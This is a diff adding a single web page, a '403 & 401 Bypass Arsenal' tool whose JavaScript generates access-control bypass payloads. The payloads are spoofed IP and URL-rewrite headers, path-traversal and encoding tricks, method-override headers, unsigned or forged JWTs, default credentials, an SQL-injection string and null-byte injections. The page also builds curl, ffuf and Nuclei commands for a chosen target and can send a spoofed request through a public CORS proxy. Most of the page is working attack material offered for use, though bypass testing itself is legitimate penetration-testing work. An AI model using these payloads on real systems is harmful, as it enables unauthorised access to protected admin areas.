@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>403 & 401 Bypass Arsenal | Web Security Tool</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f172a;
+            color: #e2e8f0;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1400px;
+            margin: auto;
+        }
+        h1 {
+            font-size: 2rem;
+            background: linear-gradient(135deg, #a5f3fc, #c084fc);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.5rem;
+        }
+        .sub {
+            color: #94a3b8;
+            margin-bottom: 2rem;
+        }
+        .card {
+            background: #1e293b;
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+        .flex-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            align-items: flex-end;
+        }
+        input, select, textarea, button {
+            background: #0f172a;
+            border: 1px solid #334155;
+            color: #f1f5f9;
+            padding: 10px 14px;
+            border-radius: 12px;
+            font-size: 0.9rem;
+            outline: none;
+        }
+        input:focus, select:focus, textarea:focus {
+            border-color: #818cf8;
+        }
+        button {
+            background: #3b82f6;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        button:hover {
+            background: #2563eb;
+        }
+        .btn-secondary {
+            background: #334155;
+        }
+        .btn-secondary:hover {
+            background: #475569;
+        }
+        .btn-warning {
+            background: #f59e0b;
+            color: #0f172a;
+        }
+        .tabs {
+            display: flex;
+            gap: 8px;
+            border-bottom: 1px solid #334155;
+            margin-bottom: 1.5rem;
+        }
+        .tab {
+            padding: 8px 18px;
+            background: #0f172a;
+            border-radius: 20px 20px 0 0;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .tab.active {
+            background: #3b82f6;
+            color: white;
+        }
+        .tab-pane {
+            display: none;
+        }
+        .tab-pane.active {
+            display: block;
+        }
+        pre {
+            background: #0f172a;
+            padding: 12px;
+            border-radius: 12px;
+            overflow-x: auto;
+            font-size: 0.8rem;
+            border: 1px solid #334155;
+        }
+        .payload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 12px;
+            max-height: 500px;
+            overflow-y: auto;
+            padding: 4px;
+        }
+        .payload-item {
+            background: #0f172a;
+            padding: 10px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            border-left: 3px solid #3b82f6;
+            word-break: break-all;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .copy-btn {
+            background: #475569;
+            padding: 4px 8px;
+            border-radius: 8px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover {
+            background: #3b82f6;
+        }
+        .status-ok {
+            color: #4ade80;
+        }
+        .status-bad {
+            color: #f87171;
+        }
+        .small-note {
+            font-size: 0.75rem;
+            color: #94a3b8;
+            margin-top: 10px;
+        }
+        .test-panel {
+            background: #0f172a;
+            padding: 1rem;
+            border-radius: 16px;
+            margin-top: 1rem;
+        }
+        @media (max-width: 700px) {
+            .flex-row {
+                flex-direction: column;
+                align-items: stretch;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🔥 403 & 401 Bypass Arsenal</h1>
+    <div class="sub">Security research tool – generate thousands of payloads to bypass forbidden & unauthorized</div>
+
+    <!-- Target Configuration -->
+    <div class="card">
+        <h3>🎯 Target URL</h3>
+        <div class="flex-row">
+            <input type="text" id="targetUrl" placeholder="https://target.com/admin" style="flex:3" value="https://example.com/admin">
+            <input type="text" id="proxyUrl" placeholder="CORS proxy (optional)" style="flex:2" value="https://cors-anywhere.herokuapp.com/">
+            <button id="testViaProxyBtn" class="btn-warning">🚀 Test via Proxy (CORS)</button>
+            <button id="copyCurlBtn">📋 Copy as curl</button>
+        </div>
+        <div class="small-note">* Direct browser fetch is blocked by CORS. Use "Copy as curl" or enable a CORS proxy (public proxies may be rate‑limited).</div>
+    </div>
+
+    <!-- Tabs: 403 bypass / 401 bypass -->
+    <div class="card">
+        <div class="tabs">
+            <div class="tab active" data-tab="tab403">🚫 403 Bypass Payloads</div>
+            <div class="tab" data-tab="tab401">🔐 401 Bypass Payloads</div>
+            <div class="tab" data-tab="tabCmd">⚡ Command Builder</div>
+        </div>
+
+        <!-- 403 TAB -->
+        <div id="tab403" class="tab-pane active">
+            <div class="flex-row" style="margin-bottom: 1rem;">
+                <select id="category403">
+                    <option value="headers">IP Spoofing Headers (300+)</option>
+                    <option value="path">Path Traversal & Bypasses (150+)</option>
+                    <option value="verb">Verb Override Headers (40+)</option>
+                    <option value="encoding">URL & Unicode Encodings (50+)</option>
+                    <option value="custom">Custom Header Combos (20+)</option>
+                </select>
+                <button id="generate403Btn">🔁 Generate Payloads</button>
+                <button id="copyAll403Btn" class="btn-secondary">📑 Copy All</button>
+            </div>
+            <div id="403payloadsContainer" class="payload-grid">
+                <!-- dynamic payloads will appear here -->
+            </div>
+        </div>
+
+        <!-- 401 TAB -->
+        <div id="tab401" class="tab-pane">
+            <div class="flex-row" style="margin-bottom: 1rem;">
+                <select id="category401">
+                    <option value="auth_headers">Authorization Header Fuzz (80+)</option>
+                    <option value="token_bypass">JWT / Token Forgery (60+)</option>
+                    <option value="basic_auth">Basic Auth Bypass (40+)</option>
+                    <option value="null_byte">Null Byte & Injections (30+)</option>
+                </select>
+                <button id="generate401Btn">🔁 Generate Payloads</button>
+                <button id="copyAll401Btn" class="btn-secondary">📑 Copy All</button>
+            </div>
+            <div id="401payloadsContainer" class="payload-grid">
+                <!-- 401 payloads -->
+            </div>
+        </div>
+
+        <!-- Command Builder Tab -->
+        <div id="tabCmd" class="tab-pane">
+            <h3>🛠️ Build custom fuzzing commands</h3>
+            <div class="test-panel">
+                <label>Select payload type:</label>
+                <select id="cmdType">
+                    <option value="curl">cURL command</option>
+                    <option value="ffuf">ffuf command (headers/wordlist)</option>
+                    <option value="nuclei">Nuclei template suggestion</option>
+                </select>
+                <div id="cmdOutput" style="margin-top: 15px;">
+                    <pre id="cmdPreview">Select a payload category above and click "Generate command"</pre>
+                    <button id="buildCmdBtn" class="btn-secondary">🚀 Generate command</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ========================
+    // 403 PAYLOAD DATASETS
+    // ========================
+    const ipHeaders = [
+        "Client-IP", "X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
+        "X-Remote-Addr", "X-Forwarded-For-Original", "X-Proxy-Host", "X-Original-Remote-Addr",
+        "True-Client-IP", "X-Host", "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL",
+        "X-Proxy-URL", "X-Forwarded-Server", "X-HTTP-DestinationURL", "X-Custom-IP-Authorization",
+        "X-Forwarded-By", "X-Forwarder-For", "X-True-IP", "Referer", "Referrer", "Redirect",
+        "Uri", "Url", "Http-Url", "Base-Url", "Request-Uri", "X-Client-IP", "X-Forward-For",
+        "X-Forwarded", "X-Http-Destinationurl", "X-Http-Host-Override", "X-Original-Url",
+        "X-Rewrite-Url", "X-Forwarded-Port", "X-Forwarded-Scheme"
+    ];
+    const ipValues = ["127.0.0.1", "0.0.0.0", "localhost", "::1", "10.0.0.1", "192.168.1.1", "172.16.0.1"];
+
+    const pathBypasses = [
+        "/.", "/../", "/%2e/", "/%2e%2e/", "/..;/", "/..%3B/", "/..%252f/",
+        "/%252e%252e%252f", "/..;/admin", "/./admin", "//", "/./", "/;/admin",
+        "/?/", "/#/", "/%20", "/%09", "/*/..", "/**/..", "/%61dmin/", "/%2561dmin/",
+        "/%2f", "/%252f", "/%c0%ae%c0%ae/", "/%ef%bc%8f", "/%e2%80%ae",
+        "/%2e%2e%2f", "/%2e%2e%2f%2e%2e%2f", "/..%c0%af", "/..%c1%9c", "/..%252f..%252f"
+    ];
+
+    const verbHeaders = ["X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override", "X-Original-Method"];
+    const verbValues = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"];
+
+    const encodings = [
+        "URL encode: /admin -> %2fadmin",
+        "Double URL: /admin -> %252fadmin",
+        "Unicode slash: /admin -> %ef%bc%8fadmin",
+        "Hex all chars: admin -> %61%64%6d%69%6e",
+        "Mixed case: /AdMiN -> /AdMiN"
+    ];
+
+    const customHeaderCombos = [
+        'X-Original-URL: /admin',
+        'X-Rewrite-URL: /admin',
+        'X-Proxy-URL: /admin',
+        'X-Forwarded-Port: 443',
+        'X-Forwarded-Port: 80',
+        'X-Forwarded-Scheme: https',
+        'X-Forwarded-Scheme: http',
+        'X-Forwarded-For: 127.0.0.1, X-Forwarded-Host: 127.0.0.1',
+        'X-Real-IP: 127.0.0.1, X-Host: localhost'
+    ];
+
+    // ========================
+    // 401 PAYLOAD DATASETS
+    // ========================
+    const authHeaders = [
+        "Authorization: Basic YWRtaW46YWRtaW4=",
+        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
+        "Authorization: Bearer null",
+        "Authorization: JWT undefined",
+        "X-JWT-TOKEN: admin",
+        "X-API-Key: 1234",
+        "X-Auth-Token: admin",
+        "Authorization: Basic YWRtaW46",
+        "Authorization: Basic Og==",
+        "Authorization: Digest username=\"admin\", realm=\"\", nonce=\"\", uri=\"/\", response=\"\""
+    ];
+
+    const tokenBypass = [
+        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiJ9.abc",
+        "Authorization: Bearer admin",
+        "X-Access-Token: admin",
+        "X-Session-Token: admin",
+        "token=admin",
+        "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
+        "Authorization: Basic YWRtaW46YWRtaW4="
+    ];
+
+    const basicAuthBypass = [
+        "admin:admin", "admin:password", "admin:12345", "root:root",
+        "user:user", "guest:guest", "admin:", ":admin", "': OR 1=1 --"
+    ];
+
+    const nullByteInjections = [
+        "%00", "%00admin", "admin%00", "admin%00.jpg", "..%00/", "%00/../admin"
+    ];
+
+    // Helper: generate IP headers
+    function generateIpHeaders() {
+        let payloads = [];
+        for (let h of ipHeaders) {
+            for (let ip of ipValues) {
+                payloads.push(`${h}: ${ip}`);
+            }
+        }
+        return payloads;
+    }
+
+    function generatePathBypasses() {
+        return pathBypasses.map(bp => `PATH append: ${bp}`);
+    }
+
+    function generateVerbOverrides() {
+        let payloads = [];
+        for (let h of verbHeaders) {
+            for (let v of verbValues) {
+                payloads.push(`${h}: ${v}`);
+            }
+        }
+        return payloads;
+    }
+
+    function generateEncodings() {
+        return encodings;
+    }
+
+    function generateCustomHeaders() {
+        return customHeaderCombos;
+    }
+
+    // 401 generators
+    function generateAuthHeaders() { return [...authHeaders]; }
+    function generateTokenBypass() { return [...tokenBypass]; }
+    function generateBasicAuth() { return basicAuthBypass.map(c => `Authorization: Basic ${btoa(c)}`); }
+    function generateNullByte() { return nullByteInjections.map(n => `Path injection: ${n}`); }
+
+    // Rendering function
+    function renderPayloads(containerId, payloads) {
+        const container = document.getElementById(containerId);
+        container.innerHTML = '';
+        payloads.forEach(p => {
+            const div = document.createElement('div');
+            div.className = 'payload-item';
+            div.innerHTML = `<span style="word-break:break-all;">${escapeHtml(p)}</span>
+                             <span class="copy-btn" onclick="copyToClipboard('${escapeHtml(p).replace(/'/g, "\\'")}')">📋 Copy</span>`;
+            container.appendChild(div);
+        });
+    }
+
+    function escapeHtml(str) {
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
+            return c;
+        });
+    }
+
+    window.copyToClipboard = function(text) {
+        navigator.clipboard.writeText(text).then(() => {
+            alert('Copied: ' + text.slice(0, 60));
+        });
+    };
+
+    // Generate based on selected category
+    document.getElementById('generate403Btn').addEventListener('click', () => {
+        const cat = document.getElementById('category403').value;
+        let payloads = [];
+        if (cat === 'headers') payloads = generateIpHeaders();
+        else if (cat === 'path') payloads = generatePathBypasses();
+        else if (cat === 'verb') payloads = generateVerbOverrides();
+        else if (cat === 'encoding') payloads = generateEncodings();
+        else if (cat === 'custom') payloads = generateCustomHeaders();
+        renderPayloads('403payloadsContainer', payloads);
+        window.current403Payloads = payloads;
+    });
+
+    document.getElementById('generate401Btn').addEventListener('click', () => {
+        const cat = document.getElementById('category401').value;
+        let payloads = [];
+        if (cat === 'auth_headers') payloads = generateAuthHeaders();
+        else if (cat === 'token_bypass') payloads = generateTokenBypass();
+        else if (cat === 'basic_auth') payloads = generateBasicAuth();
+        else if (cat === 'null_byte') payloads = generateNullByte();
+        renderPayloads('401payloadsContainer', payloads);
+        window.current401Payloads = payloads;
+    });
+
+    // Copy all
+    document.getElementById('copyAll403Btn').addEventListener('click', () => {
+        if (window.current403Payloads) {
+            navigator.clipboard.writeText(window.current403Payloads.join('\n'));
+            alert('Copied all 403 payloads');
+        } else alert('Generate payloads first');
+    });
+    document.getElementById('copyAll401Btn').addEventListener('click', () => {
+        if (window.current401Payloads) {
+            navigator.clipboard.writeText(window.current401Payloads.join('\n'));
+            alert('Copied all 401 payloads');
+        } else alert('Generate payloads first');
+    });
+
+    // curl copy
+    document.getElementById('copyCurlBtn').addEventListener('click', () => {
+        let url = document.getElementById('targetUrl').value;
+        let curlCmd = `curl -X GET "${url}" \\\n  -H "User-Agent: Mozilla/5.0" \\\n  -H "X-Forwarded-For: 127.0.0.1" \\\n  -H "X-Original-URL: /admin"`;
+        navigator.clipboard.writeText(curlCmd);
+        alert('Sample curl command copied (edit headers as needed)');
+    });
+
+    // Test via proxy (CORS aware)
+    document.getElementById('testViaProxyBtn').addEventListener('click', async () => {
+        let target = document.getElementById('targetUrl').value;
+        let proxy = document.getElementById('proxyUrl').value;
+        if (!proxy) {
+            alert('Please enter a CORS proxy URL (e.g., https://cors-anywhere.herokuapp.com/)');
+            return;
+        }
+        let fullUrl = proxy.endsWith('/') ? proxy + target : proxy + '/' + target;
+        try {
+            let resp = await fetch(fullUrl, {
+                method: 'GET',
+                headers: { 'X-Forwarded-For': '127.0.0.1' }
+            });
+            alert(`Response status: ${resp.status} (via proxy). Check console for details.`);
+            console.log(await resp.text());
+        } catch(e) {
+            alert('Proxy error: ' + e.message);
+        }
+    });
+
+    // Command Builder
+    document.getElementById('buildCmdBtn').addEventListener('click', () => {
+        const url = document.getElementById('targetUrl').value;
+        const type = document.getElementById('cmdType').value;
+        let cmd = '';
+        if (type === 'curl') {
+            cmd = `# Example curl with multiple bypass headers\ncurl -X GET "${url}" \\\n  -H "X-Forwarded-For: 127.0.0.1" \\\n  -H "X-Original-URL: /admin" \\\n  -H "X-HTTP-Method-Override: GET" \\\n  --insecure`;
+        } else if (type === 'ffuf') {
+            cmd = `# ffuf to fuzz headers (create headers.txt with lines like "X-Forwarded-For: 127.0.0.1")\nffuf -u "${url}" -H "Host: FUZZ" -w headers.txt -mc 200,301,302 -t 20`;
+        } else if (type === 'nuclei') {
+            cmd = `# Nuclei template example (403 bypass)\nid: 403-bypass\ninfo:\n  name: 403 Bypass\n  severity: info\nrequests:\n  - method: GET\n    path:\n      - "{{BaseURL}}/admin/..;/"\n    headers:\n      X-Forwarded-For: "127.0.0.1"`;
+        }
+        document.getElementById('cmdPreview').innerText = cmd;
+    });
+
+    // Tab switching
+    const tabs = document.querySelectorAll('.tab');
+    const panes = document.querySelectorAll('.tab-pane');
+    tabs.forEach(tab => {
+        tab.addEventListener('click', () => {
+            const targetId = tab.getAttribute('data-tab');
+            tabs.forEach(t => t.classList.remove('active'));
+            panes.forEach(p => p.classList.remove('active'));
+            tab.classList.add('active');
+            document.getElementById(targetId).classList.add('active');
+        });
+    });
+
+    // initial generate
+    document.getElementById('generate403Btn').click();
+    document.getElementById('generate401Btn').click();
+</script>
+</body>
+</html>
